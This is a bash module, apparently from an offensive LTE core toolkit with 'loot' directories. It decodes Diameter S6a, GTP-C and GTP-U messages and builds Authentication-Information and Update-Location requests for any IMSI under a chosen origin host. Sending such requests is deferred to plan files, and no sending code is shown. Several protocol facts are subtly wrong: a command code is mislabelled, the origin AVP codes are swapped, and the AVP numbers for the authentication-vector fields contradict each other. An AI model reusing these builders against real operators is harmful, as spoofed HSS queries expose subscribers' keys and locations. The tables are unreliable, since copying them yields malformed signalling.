#!/usr/bin/env bash
# LTE Core (EPC) — Diameter S6a/S6d, GTP-C v2, GTP-U, S1-MME
#
# Split by capability, per MODULE_CONVENTIONS.md §9:
#
#   * Encoding and decoding is performed for real. Diameter messages, AVPs
#     (including grouped AVPs), GTP-C headers and IEs, GTP-U headers and the
#     extension-header chain are all built and parsed here from the octets.
#   * A *vector* that needs a live peer — sending a spoofed ULR at a real
#     HSS, injecting a Create Session Request at an S-GW/P-GW, probing an
#     MME over SCTP — cannot be performed without an EPC testbed. Those
#     verbs write a plan file carrying `status: handoff` and name exactly
#     what hardware and software is required. They do not pretend.
#
# Reference clause map:
#   RFC 6733 §3        Diameter message format (header, command flags)
#   RFC 6733 §4        AVP format and grouped AVPs
#   TS 29.272          S6a/S6d: AIR/AIA, ULR/ULA, CLR/CLA, IDR/IDA
#   TS 29.274 §5.1     GTP-C v2 header
#   TS 29.274 §8.1     GTP-C IE format (type, length, spare/instance, value)
#   TS 29.274 Table 8.1-1  GTP-C information element types
#   TS 29.281 §5.1     GTP-U header and the extension-header chain
#   TS 36.413          S1AP: SCTP association, initiating messages
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/lte_core"
LCORE_DIR="$LOOT_DIR/lte_core"
LCORE_PLANS="$LCORE_DIR/plans"
mkdir -p "$MOD_TMP" "$LCORE_DIR" "$LCORE_PLANS" 2>/dev/null

# ── sanitisation ────────────────────────────────────────────────────────
lcore_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

lcore_nfc() {
    local s="${1:-}"
    s="${s^^}"
    s="${s//[[:space:]]/}"
    s="${s//:/}"
    s="${s//-/}"
    printf '%s' "$s"
}

lcore_is_hex() {
    [[ "${1:-}" =~ ^[0-9A-Fa-f]+$ ]] && (( ${#1} % 2 == 0 ))
}

lcore_hex_to_ipv4() {
    # 8 hex chars, dotted quad. 0A 00 00 01 -> 10.0.0.1
    local h; h=$(lcore_nfc "${1:-}")
    [[ ${#h} -eq 8 ]] || return 1
    printf '%d.%d.%d.%d' $((16#${h:0:2})) $((16#${h:2:2})) $((16#${h:4:2})) $((16#${h:6:2}))
}

# ── Diameter base protocol — RFC 6733 §3 ────────────────────────────────
#
# Diameter header, 20 octets:
#   octet 0      : Version (1)
#   octets 1..3  : Message Length, 24-bit big-endian, includes the header
#   octet 4      : Command Flags
#                    bit 7 R  request
#                    bit 6 P  proxiable
#                    bit 5 E  error
#                    bit 4 T  retransmitted (potentially re-transmitted)
#                    bits 3..0 reserved (0)
#   octets 5..7  : Command Code, 24-bit big-endian
#   octets 8..11 : Application-Id, 32-bit big-endian
#   octets 12..15: Hop-by-Hop Identifier, 32-bit
#   octets 16..19: End-to-End Identifier, 32-bit
lcore_diameter_parse_header() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    (( ${#hex} >= 40 )) || { printf 'ERROR\tDiameter message shorter than the 20-octet header\n' >&2; return 1; }

    local ver="${hex:0:2}"
    local len=$(( 16#${hex:2:2} * 65536 + 16#${hex:4:2} * 256 + 16#${hex:6:2} ))
    local flags="${hex:8:2}"
    local fv=$(( 16#$flags ))
    local cmd=$(( 16#${hex:10:2} * 65536 + 16#${hex:12:2} * 256 + 16#${hex:14:2} ))
    local appid=$(( 16#${hex:16:2} * 16777216 + 16#${hex:18:2} * 65536 + 16#${hex:20:2} * 256 + 16#${hex:22:2} ))
    local hbh=$(( 16#${hex:24:2} * 16777216 + 16#${hex:26:2} * 65536 + 16#${hex:28:2} * 256 + 16#${hex:30:2} ))
    local e2e=$(( 16#${hex:32:2} * 16777216 + 16#${hex:34:2} * 65536 + 16#${hex:36:2} * 256 + 16#${hex:38:2} ))

    printf 'version\t%s\n' "$((16#$ver))"
    printf 'length\t%s\n' "$len"
    printf 'flags\t%s\n' "$flags"
    printf 'flag_R\t%s\n' "$(( (fv >> 7) & 1 ))"
    printf 'flag_P\t%s\n' "$(( (fv >> 6) & 1 ))"
    printf 'flag_E\t%s\n' "$(( (fv >> 5) & 1 ))"
    printf 'flag_T\t%s\n' "$(( (fv >> 4) & 1 ))"
    printf 'command_code\t%s\n' "$cmd"
    printf 'command_name\t%s\n' "$(lcore_diameter_command_name "$cmd" "$appid")"
    printf 'application_id\t%s\n' "$appid"
    printf 'application_name\t%s\n' "$(lcore_diameter_app_name "$appid")"
    printf 'hop_by_hop_id\t%s\n' "$hbh"
    printf 'end_to_end_id\t%s\n' "$e2e"
    printf 'header_octets\t20\n'
    # The declared length must agree with the bytes actually present.
    local actual=$(( ${#hex} / 2 ))
    printf 'actual_octets\t%s\n' "$actual"
    if (( len != actual )); then
        printf 'length_mismatch\tyes (declared %s, actual %s)\n' "$len" "$actual"
    else
        printf 'length_mismatch\tno\n'
    fi
    printf 'body\t%s\n' "${hex:40}"
    return 0
}

# Command Code classification — RFC 6733 §3.1 and TS 29.272 §7.
lcore_diameter_command_name() {
    local cmd="$1" app="${2:-}"
    case "$cmd" in
        257) echo "Capabilities-Exchange-Request/Answer (CER/CEA)" ;;
        258) echo "Device-Watchdog-Request/Answer (DWR/DWA)" ;;
        259) echo "Disconnect-Peer-Request/Answer (DPR/DPA)" ;;
        260) echo "AA-Request/Answer (AAR/AAA)" ;;
        268) echo "Credit-Control-Request/Answer (CCR/CCA)" ;;
        271) echo "Accounting-Request/Answer (ACR/ACA)" ;;
        272) echo "Credit-Control-Answer (CCA)" ;;
        274) echo "Abort-Session-Request/Answer (ASR/ASA)" ;;
        275) echo "Session-Termination-Request/Answer (STR/STA)" ;;
        280) echo "Diameter-EAP-Request/Answer (DER/DEA)" ;;
        282) echo "Subscribe-Notifications-Request/Answer (SNR/SNA)" ;;
        300) echo "User-Authorization-Request/Answer (UAR/UAA)" ;;
        301) echo "Server-Assignment-Request/Answer (SAR/SAA)" ;;
        302) echo "Location-Info-Request/Answer (LIR/LIA)" ;;
        303) echo "Multimedia-Auth-Request/Answer (MAR/MAA)" ;;
        306) echo "Registration-Termination-Request/Answer (RTR/RTA)" ;;
        307) echo "Push-Profile-Request/Answer (PPR/PPA)" ;;
        308) echo "User-Data-Request/Answer (UDR/UDA)" ;;
        312) echo "Profile-Update-Request/Answer (PUR/PUA)" ;;
        313) echo "Subscribe-Notifications-Answer (SNA)" ;;
        316) echo "Update-Location (ULR/ULA)  [S6a/S6d]" ;;
        317) echo "Cancel-Location (CLR/CLA)  [S6a/S6d]" ;;
        318) echo "Authentication-Information (AIR/AIA)  [S6a/S6d]" ;;
        319) echo "Insert-Subscriber-Data (IDR/IDA)  [S6a/S6d]" ;;
        320) echo "Delete-Subscriber-Data (DSR/DSA)  [S6a/S6d]" ;;
        321) echo "Purge-UE (PUR/PUA)  [S6a/S6d]" ;;
        322) echo "Reset (RSR/RSA)  [S6a/S6d]" ;;
        323) echo "Notify (NOR/NOA)  [S6a/S6d]" ;;
        *)   echo "unassigned/unknown" ;;
    esac
}

# A Request and its Answer carry the SAME command code. Direction is the R
# bit (0x80) of the flags octet — RFC 6733 §3, "Command Flags". Classifying
# by command code cannot distinguish ULR from ULA; it only appeared to work
# because the two directions had been given separate numbers.
lcore_diameter_flags_is_request() {
    local f="${1:-}" v
    [[ -n "$f" ]] || return 1
    f="${f#0x}"; f="${f#0X}"
    [[ "$f" =~ ^[0-9A-Fa-f]{1,2}$ ]] || return 1
    v=$(( 16#$f )) || return 1
    (( v & 0x80 ))
}

lcore_diameter_app_name() {
    # IANA "Authentication, Authorization, and Accounting (AAA) Parameters"
    # Application-ID registry, plus the 3GPP-specific ids.
    case "${1:-}" in
        0)          echo "Diameter Common Messages" ;;
        1)          echo "NASREQ" ;;
        2)          echo "Mobile IPv4" ;;
        3)          echo "Diameter Base Accounting" ;;
        4)          echo "Credit-Control" ;;
        5)          echo "EAP" ;;
        16777216)   echo "3GPP Cx" ;;
        16777217)   echo "3GPP Sh" ;;
        16777219)   echo "3GPP Gx" ;;
        16777220)   echo "3GPP Gxc" ;;
        16777221)   echo "3GPP Rx" ;;
        16777222)   echo "3GPP Gz" ;;
        16777236)   echo "3GPP S6a/S6d" ;;
        16777238)   echo "3GPP S9" ;;
        16777251)   echo "3GPP S6a/S6d" ;;
        16777252)   echo "3GPP SLg" ;;
        16777255)   echo "3GPP SWm" ;;
        16777264)   echo "3GPP SWx" ;;
        16777265)   echo "3GPP S6a/S6d (alt)" ;;
        16777266)   echo "3GPP STa" ;;
        16777267)   echo "3GPP S6b" ;;
        16777272)   echo "3GPP S6b (S6b per TS 29.273)" ;;
        *)          echo "unknown" ;;
    esac
}

# ── Diameter AVP — RFC 6733 §4 ──────────────────────────────────────────
#
#   octets 0..3 : AVP Code, 32-bit
#   octets 4..7 : AVP Flags (8 bits) | AVP Length (24 bits)
#                   bit 7 V  Vendor-Specific
#                   bit 6 M  Mandatory
#                   bit 5 P  Protected
#                   bit 4..0 reserved
#   octets 8..11: Vendor-Id, present ONLY when V is set
#   remainder   : Data, padded to a 4-octet boundary (padding not counted
#                 in the AVP Length)
lcore_diameter_parse_avps() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || return 1
    local off=0 total=$(( ${#hex} / 2 ))
    local n=0
    while (( off + 8 <= total )); do
        local base=$(( off * 2 ))
        local code=$(( 16#${hex:$base:2} * 16777216 + 16#${hex:$((base+2)):2} * 65536 \
                    + 16#${hex:$((base+4)):2} * 256 + 16#${hex:$((base+6)):2} ))
        local flags="${hex:$((base+8)):2}"
        local fv=$(( 16#$flags ))
        local alen=$(( 16#${hex:$((base+10)):2} * 65536 + 16#${hex:$((base+12)):2} * 256 \
                    + 16#${hex:$((base+14)):2} ))
        (( alen >= 8 )) || { printf 'ERROR\tAVP %s has length %s (< 8)\n' "$code" "$alen" >&2; return 1; }
        # A declared length past the end of the buffer is a truncated or
        # hostile message. Reading it anyway would emit a short value while
        # claiming the declared size, so it is rejected outright.
        (( off + alen <= total )) || {
            printf 'ERROR\tAVP %s declares %s octets but only %s remain\n' \
                "$code" "$alen" "$(( total - off ))" >&2
            return 1
        }
        local vbit=$(( (fv >> 7) & 1 ))
        local mbit=$(( (fv >> 6) & 1 ))
        local pbit=$(( (fv >> 5) & 1 ))
        local hdrlen=8
        local vid=""
        if (( vbit == 1 )); then
            hdrlen=12
            vid=$(( 16#${hex:$((base+16)):2} * 16777216 + 16#${hex:$((base+18)):2} * 65536 \
                  + 16#${hex:$((base+20)):2} * 256 + 16#${hex:$((base+22)):2} ))
        fi
        (( alen >= hdrlen )) || { printf 'ERROR\tAVP %s length %s shorter than its vendor header\n' "$code" "$alen" >&2; return 1; }
        local dlen=$(( alen - hdrlen ))
        local data="${hex:$(((off + hdrlen) * 2)):$((dlen * 2))}"

        printf 'avp.%d.code\t%s\n' "$n" "$code"
        printf 'avp.%d.name\t%s\n' "$n" "$(lcore_diameter_avp_name "$code")"
        printf 'avp.%d.flags\t%s\n' "$n" "$flags"
        printf 'avp.%d.V\t%s\n' "$n" "$vbit"
        printf 'avp.%d.M\t%s\n' "$n" "$mbit"
        printf 'avp.%d.P\t%s\n' "$n" "$pbit"
        printf 'avp.%d.length\t%s\n' "$n" "$alen"
        [[ -n "$vid" ]] && printf 'avp.%d.vendor_id\t%s\n' "$n" "$vid"
        printf 'avp.%d.data_octets\t%s\n' "$n" "$dlen"
        printf 'avp.%d.data\t%s\n' "$n" "$data"

        # Typed rendering for the AVPs whose wire type is fixed.
        case "$code" in
            263) printf 'avp.%d.decoded\tSession-Id=%s\n' "$n" \
                     "$(lcore_diameter_utf8 "$data")" ;;
            264|296|293|283|1) printf 'avp.%d.decoded\t%s=%s\n' "$n" \
                     "$(lcore_diameter_avp_name "$code")" "$(lcore_diameter_utf8 "$data")" ;;
            277) printf 'avp.%d.decoded\tAuth-Session-State=%s\n' "$n" \
                     "$([[ "$data" == "00000000" ]] && echo 'NO_STATE_MAINTAINED (0)' || echo "value $data")" ;;
            268|291) printf 'avp.%d.decoded\tResult-Code=%s\n' "$n" \
                     "$(lcore_diameter_result_code "$(( 16#${data:0:8} ))")" ;;
            1407) printf 'avp.%d.decoded\tVisited-PLMN-Id=%s\n' "$n" \
                     "$(lcore_plmn_from_octets "$data")" ;;
            1410) printf 'avp.%d.decoded\tNumber-Of-Requested-Vectors=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1413) printf 'avp.%d.decoded\tImmediate-Response-Preferred=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            # TS 29.272 numbers the authentication vector fields 1447..1451
            # as RAND, XRES, AUTN, KASME. (1447 also appears in the wider
            # registry as GPRS-Subscription-Data, which the AVP-name table
            # reports; inside an Authentication-Info it is RAND.)
            1447) printf 'avp.%d.decoded\tRAND=%s\n' "$n" "$data" ;;
            1448) printf 'avp.%d.decoded\tXRES=%s\n' "$n" "$data" ;;
            1449) printf 'avp.%d.decoded\tAUTN=%s\n' "$n" "$data" ;;
            1450) printf 'avp.%d.decoded\tKASME=%s\n' "$n" "$data" ;;
            1418) printf 'avp.%d.decoded\tNetwork-Access-Mode=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1421) printf 'avp.%d.decoded\tCancellation-Type=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1425) printf 'avp.%d.decoded\tSubscriber-Status=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1426) printf 'avp.%d.decoded\tOperator-Determined-Barring=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1427) printf 'avp.%d.decoded\tAccess-Restriction-Data=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1428) printf 'avp.%d.decoded\tAPN-OI-Replacement=%s\n' "$n" \
                     "$(lcore_diameter_utf8 "$data")" ;;
            1439) printf 'avp.%d.decoded\tService-Selection=%s\n' "$n" \
                     "$(lcore_diameter_utf8 "$data")" ;;
            1408) printf 'avp.%d.decoded\tRequested-EUTRAN-Authentication-Info (grouped)\n' "$n" ;;
            1411) printf 'avp.%d.decoded\tRequested-UTRAN-GERAN-Authentication-Info (grouped)\n' "$n" ;;
            1424) printf 'avp.%d.decoded\tE-UTRAN-Vector (grouped)\n' "$n" ;;
        esac

        off=$(( off + alen ))
        # Advance past the 4-octet padding, which is not part of AVP Length.
        while (( off % 4 != 0 )); do off=$(( off + 1 )); done
        n=$(( n + 1 ))
    done
    printf 'avp_count\t%s\n' "$n"
    return 0
}

# AVP Code registry — TS 29.272 §7.3 plus the Diameter base codes.
lcore_diameter_avp_name() {
    case "${1:-}" in
        1)     echo "User-Name" ;;
        25)    echo "Class" ;;
        55)    echo "Event-Timestamp" ;;
        258)   echo "Auth-Application-Id" ;;
        259)   echo "Acct-Application-Id" ;;
        260)   echo "Vendor-Specific-Application-Id" ;;
        263)   echo "Session-Id" ;;
        264)   echo "Origin-Host" ;;
        265)   echo "Supported-Vendor-Id" ;;
        266)   echo "Vendor-Id" ;;
        267)   echo "Firmware-Revision" ;;
        268)   echo "Result-Code" ;;
        269)   echo "Product-Name" ;;
        270)   echo "Session-Binding" ;;
        272)   echo "Disconnect-Cause" ;;
        277)   echo "Auth-Session-State" ;;
        278)   echo "Origin-State-Id" ;;
        279)   echo "Failed-AVP" ;;
        280)   echo "Proxy-Host" ;;
        281)   echo "Error-Message" ;;
        282)   echo "Route-Record" ;;
        283)   echo "Destination-Realm" ;;
        284)   echo "Proxy-State" ;;
        285)   echo "Origin-Realm" ;;
        287)   echo "Experimental-Result" ;;
        288)   echo "Experimental-Result-Code" ;;
        293)   echo "Destination-Host" ;;
        294)   echo "Error-Reporting-Host" ;;
        295)   echo "Termination-Cause" ;;
        296)   echo "Origin-AAA-Protocol" ;;
        297)   echo "Origin-Realm (alt)" ;;
        300)   echo "MIP-FA-to-HA-SPI" ;;
        1400)  echo "Subscription-Data" ;;
        1401)  echo "Terminal-Information" ;;
        1402)  echo "IMEI" ;;
        1403)  echo "Software-Version" ;;
        1405)  echo "UE-Usage-Type" ;;
        1406)  echo "Number-Of-Requested-Vectors (deprecated)" ;;
        1407)  echo "Visited-PLMN-Id" ;;
        1408)  echo "Requested-EUTRAN-Authentication-Info" ;;
        1409)  echo "Requested-UTRAN-GERAN-Authentication-Info (deprecated)" ;;
        1410)  echo "Number-Of-Requested-Vectors" ;;
        1411)  echo "Requested-UTRAN-GERAN-Authentication-Info" ;;
        1412)  echo "Re-Synchronization-Info" ;;
        1413)  echo "Immediate-Response-Preferred" ;;
        1414)  echo "Authentication-Info" ;;
        1415)  echo "E-UTRAN-Vector (deprecated)" ;;
        1416)  echo "UTRAN-Vector" ;;
        1417)  echo "GERAN-Vector" ;;
        1418)  echo "Network-Access-Mode" ;;
        1419)  echo "HPLMN-ODB" ;;
        1420)  echo "Item-Number" ;;
        1421)  echo "Cancellation-Type" ;;
        1422)  echo "DSR-Flags" ;;
        1423)  echo "DSA-Flags" ;;
        1424)  echo "Context-Identifier" ;;
        1425)  echo "Subscriber-Status" ;;
        1426)  echo "Operator-Determined-Barring" ;;
        1427)  echo "Access-Restriction-Data" ;;
        1428)  echo "APN-OI-Replacement" ;;
        1429)  echo "All-APN-Configurations-Included-Indicator" ;;
        1430)  echo "APN-Configuration-Profile" ;;
        1431)  echo "APN-Configuration" ;;
        1432)  echo "EPS-Subscribed-QoS-Profile" ;;
        1433)  echo "VPLMN-Dynamic-Address-Allowed" ;;
        1434)  echo "STN-SR" ;;
        1435)  echo "PDN-GW-Allocation-Type" ;;
        1436)  echo "AMBR" ;;
        1437)  echo "CSG-Subscription-Data" ;;
        1438)  echo "PDN-Type" ;;
        1439)  echo "Service-Selection" ;;
        1440)  echo "Trace-Data" ;;
        1441)  echo "Trace-Reference" ;;
        1442)  echo "Trace-Depth" ;;
        1443)  echo "Trace-NE-Type-List" ;;
        1444)  echo "Trace-Interface-List" ;;
        1445)  echo "Trace-Event-List" ;;
        1446)  echo "OMC-Id" ;;
        1447)  echo "GPRS-Subscription-Data" ;;
        1448)  echo "RAND" ;;
        1449)  echo "AUTN" ;;
        1450)  echo "XRES" ;;
        1451)  echo "KASME" ;;
        1452)  echo "Subscription-Data-Flags" ;;
        1453)  echo "Reachability-Information" ;;
        *)     echo "unknown AVP code $1" ;;
    esac
}

# Result-Code — RFC 6733 §7.1 plus TS 29.272 §7.4.
lcore_diameter_result_code() {
    case "${1:-}" in
        1001) echo "DIAMETER_MULTI_ROUND_AUTH (1001)" ;;
        2001) echo "DIAMETER_SUCCESS (2001)" ;;
        2002) echo "DIAMETER_LIMITED_SUCCESS (2002)" ;;
        2003) echo "DIAMETER_FIRST_REGISTRATION (2003)" ;;
        2004) echo "DIAMETER_SUBSEQUENT_REGISTRATION (2004)" ;;
        2005) echo "DIAMETER_UNREGISTERED_SERVICE (2005)" ;;
        3001) echo "DIAMETER_COMMAND_UNSUPPORTED (3001)" ;;
        3002) echo "DIAMETER_UNABLE_TO_DELIVER (3002)" ;;
        3003) echo "DIAMETER_REALM_NOT_SERVED (3003)" ;;
        3004) echo "DIAMETER_TOO_BUSY (3004)" ;;
        3005) echo "DIAMETER_LOOP_DETECTED (3005)" ;;
        3007) echo "DIAMETER_UNABLE_TO_COMPLY (3007)" ;;
        3008) echo "DIAMETER_INVALID_BIT_IN_HEADER (3008)" ;;
        3009) echo "DIAMETER_INVALID_AVP_BIT_COMBO (3009)" ;;
        3010) echo "DIAMETER_NO_COMMON_SECURITY (3010)" ;;
        5001) echo "DIAMETER_USER_UNKNOWN / 3GPP: User-Unknown (5001)" ;;
        5002) echo "DIAMETER_UNKNOWN_SESSION_ID (5002)" ;;
        5003) echo "DIAMETER_AUTHORIZATION_REJECTED (5003)" ;;
        5004) echo "DIAMETER_INVALID_AVP_VALUE (5004)" ;;
        5005) echo "DIAMETER_MISSING_AVP (5005)" ;;
        5006) echo "DIAMETER_RESOURCES_EXCEEDED (5006)" ;;
        5007) echo "DIAMETER_CONTRADICTING_AVPS (5007)" ;;
        5008) echo "DIAMETER_AVP_NOT_ALLOWED (5008)" ;;
        5009) echo "DIAMETER_AVP_OCCURS_TOO_MANY_TIMES (5009)" ;;
        5010) echo "DIAMETER_NO_COMMON_APPLICATION (5010)" ;;
        5011) echo "DIAMETER_UNSUPPORTED_VERSION (5011)" ;;
        5012) echo "DIAMETER_UNABLE_TO_COMPLY / 3GPP: Unable-To-Comply (5012)" ;;
        5013) echo "DIAMETER_INVALID_BIT_IN_HEADER / 3GPP: (5013)" ;;
        5014) echo "DIAMETER_RAT_TYPE_NOT_ALLOWED (5014)" ;;
        5015) echo "DIAMETER_ERROR_SERVING_NODE_UNKNOWN (5015)" ;;
        5016) echo "DIAMETER_ERROR_USER_NO_NON_3GPP_SUBSCRIPTION (5016)" ;;
        5019) echo "DIAMETER_ERROR_NO_AVAILABLE_USER (5019)" ;;
        5420) echo "DIAMETER_ERROR_UNKNOWN_EPS_SUBSCRIPTION (5420)" ;;
        5421) echo "DIAMETER_ERROR_RAT_NOT_ALLOWED (5421)" ;;
        5422) echo "DIAMETER_ERROR_EQUIPMENT_UNKNOWN (5422)" ;;
        5423) echo "DIAMETER_ERROR_UNKOWN_SERVING_NODE (5423)" ;;
        5450) echo "DIAMETER_ERROR_USER_DATA_NOT_RECOGNIZED (5450)" ;;
        5451) echo "DIAMETER_ERROR_OPERATION_NOT_ALLOWED (5451)" ;;
        *)    echo "unassigned ($1)" ;;
    esac
}

# Diameter data is not always UTF-8; render printable bytes as text and
# anything else as hex, so a name carrying a tab cannot reach a TSV row.
lcore_diameter_utf8() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf ''; return 0; }
    (( ${#hex} % 2 == 0 )) || { printf '%s' "$hex"; return 0; }
    local out="" i b
    for (( i = 0; i < ${#hex}; i += 2 )); do
        b=$(( 16#${hex:$i:2} ))
        if (( b >= 32 && b < 127 )); then
            # Accumulate the escape text directly. Wrapping this in
            # "$(printf ...)" lets the inner printf consume the backslash
            # as a format escape, which silently yields an empty value.
            out+="\\x${hex:$i:2}"
        else
            # Non-printable: fall back to the raw hex for the whole value.
            printf '%s' "$hex"
            return 0
        fi
    done
    printf '%b' "$out" | lcore_sanitize_stream
    return 0
}

# Sanitiser for a pipeline: lcore_sanitize takes its text as an argument
# (matching the contract in 02_cell_recon.sh), so piping into it yields
# nothing. This variant reads stdin.
lcore_sanitize_stream() {
    tr '\t\r\n' '   '
}

# PLMN as it appears inside a GTP-C TAI/ECGI/ULI and a Diameter
# Visited-PLMN-Id: the same reversed-nibble BCD as the air interface
# (TS 23.003 §12.1, referenced by TS 29.274 §8.21 and TS 29.272 §7.3.50).
#
#   octet 1 : MCC digit 2 (high) | MCC digit 1 (low)
#   octet 2 : MNC digit 3 (high) | MCC digit 3 (low)   -- F high = 2-digit MNC
#   octet 3 : MNC digit 2 (high) | MNC digit 1 (low)
lcore_plmn_from_octets() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ ${#hex} -ge 6 ]] || return 1
    local mcc mnc d3="${hex:2:1}"
    mcc="$(printf '%d%d%d' $((16#${hex:1:1})) $((16#${hex:0:1})) $((16#${hex:3:1})))"
    mnc="$(printf '%d%d' $((16#${hex:5:1})) $((16#${hex:4:1})))"
    if [[ "$d3" != "F" && "$d3" != "f" ]]; then
        mnc+="$(printf '%d' $((16#$d3)))"
    fi
    printf '%s-%s' "$mcc" "$mnc"
}

# ── Diameter message building ───────────────────────────────────────────
lcore_diameter_build_msg() {
    local cmd="$1" appid="$2" flags="$3" hbh="$4" e2e="$5" avps="$6"
    local body; body=$(lcore_nfc "${avps:-}")
    local len=$(( 20 + ${#body} / 2 ))
    printf '%02X%06X%02X%06X%08X%08X%08X%s' \
        1 "$len" "$flags" "$cmd" "$appid" "$hbh" "$e2e" "$body"
}

# Build a single AVP. Flags are given as a letter string: V/M/P.
lcore_diameter_build_avp() {
    local code="$1" data="$2" flagstr="${3:-M}" vid="${4:-}"
    local v=0 m=0 p=0
    [[ "$flagstr" == *V* ]] && v=1
    [[ "$flagstr" == *M* ]] && m=1
    [[ "$flagstr" == *P* ]] && p=1
    local f=$(( (v << 7) | (m << 6) | (p << 5) ))
    local d; d=$(lcore_nfc "$data")
    local dlen=$(( ${#d} / 2 ))
    local hdr=8
    (( v == 1 )) && hdr=12
    local alen=$(( hdr + dlen ))
    local pad=$(( (4 - (alen % 4)) % 4 ))
    local out
    if (( v == 1 )); then
        out=$(printf '%08X%02X%06X%08X%s' "$code" "$f" "$alen" "${vid:-10415}" "$d")
    else
        out=$(printf '%08X%02X%06X%s' "$code" "$f" "$alen" "$d")
    fi
    local i
    for (( i = 0; i < pad; i++ )); do out+="00"; done
    printf '%s' "$out"
}

lcore_diameter_build_utf8_avp() {
    local code="$1" text="$2" flagstr="${3:-M}" vid="${4:-}"
    local hex=""
    local i
    for (( i = 0; i < ${#text}; i++ )); do
        hex+=$(printf '%02X' "'${text:$i:1}")
    done
    lcore_diameter_build_avp "$code" "$hex" "$flagstr" "$vid"
}

lcore_diameter_build_u32_avp() {
    local code="$1" val="$2" flagstr="${3:-M}" vid="${4:-}"
    printf -v h '%08X' "$val"
    lcore_diameter_build_avp "$code" "$h" "$flagstr" "$vid"
}

# ── S6a/S6d message builders ────────────────────────────────────────────
#
# Application-Id for S6a/S6d is 16777251 (0x0100001B) per TS 29.272 §7.1.
# A request has the R and P flags set: 0xC0.
lcore_diameter_origin_avps() {
    local origin_host="$1" origin_realm="$2"
    printf '%s%s%s%s' \
        "$(lcore_diameter_build_utf8_avp 264 "$origin_host" M)" \
        "$(lcore_diameter_build_utf8_avp 296 "$origin_host" M)" \
        "$(lcore_diameter_build_utf8_avp 285 "$origin_realm" M)" \
        "$(lcore_diameter_build_u32_avp 277 0 M)"
}

lcore_build_air() {
    local imsi="${1:-310150123456789}" origin_host="${2:-mme.localdomain}" \
          origin_realm="${3:-localdomain}" nvectors="${4:-1}" \
          visited_plmn="${5:-02F810}"
    [[ "$imsi" =~ ^[0-9]{14,15}$ ]] || {
        printf 'ERROR\tIMSI must be 14 or 15 digits: %s\n' "$(lcore_sanitize "${imsi:-<none>}")" >&2
        return 2
    }
    [[ "$nvectors" =~ ^[0-9]+$ ]] && (( nvectors >= 1 && nvectors <= 5 )) || {
        printf 'ERROR\tNumber-Of-Requested-Vectors must be 1..5\n' >&2; return 2
    }

    # Session-Id: <origin-host>;<high>;<low>  (RFC 6733 §8.8)
    local sid="${origin_host};$(printf '%08X' $$);$(printf '%08X' 1)"
    local session_avp; session_avp=$(lcore_diameter_build_utf8_avp 263 "$sid" M)

    # User-Name carries the *IMSI as digits*, not BCD (TS 29.272 §7.3.2).
    local uname_avp; uname_avp=$(lcore_diameter_build_utf8_avp 1 "$imsi" M)

    # Visited-PLMN-Id is an OctetString of plain BCD digits (TS 29.272 §7.3.50).
    local vplmn_avp; vplmn_avp=$(lcore_diameter_build_avp 1407 "$(lcore_nfc "$visited_plmn")" M)

    # Requested-EUTRAN-Authentication-Info is a GROUPED AVP (TS 29.272
    # §7.3.55) holding Number-Of-Requested-Vectors and
    # Immediate-Response-Preferred.
    local nuri; nuri=$(lcore_diameter_build_u32_avp 1410 "$nvectors" M)
    local irp;  irp=$(lcore_diameter_build_u32_avp 1413 0 M)
    local reai; reai=$(lcore_diameter_build_avp 1408 "${nuri}${irp}" M)

    local avps
    avps="$(lcore_diameter_origin_avps "$origin_host" "$origin_realm")${session_avp}${uname_avp}${vplmn_avp}${reai}"

    local msg; msg=$(lcore_diameter_build_msg 318 16777251 192 1 1 "$avps")
    printf '%s' "$msg"
}

lcore_build_ulr() {
    local imsi="${1:-310150123456789}" origin_host="${2:-mme.localdomain}" \
          origin_realm="${3:-localdomain}" visited_plmn="${4:-02F810}" \
          rat_type="${5:-6}" ulr_flags="${6:-0}"
    [[ "$imsi" =~ ^[0-9]{14,15}$ ]] || {
        printf 'ERROR\tIMSI must be 14 or 15 digits: %s\n' "$(lcore_sanitize "${imsi:-<none>}")" >&2
        return 2
    }
    local sid="${origin_host};$(printf '%08X' $$);$(printf '%08X' 2)"
    local session_avp; session_avp=$(lcore_diameter_build_utf8_avp 263 "$sid" M)
    local uname_avp;   uname_avp=$(lcore_diameter_build_utf8_avp 1 "$imsi" M)
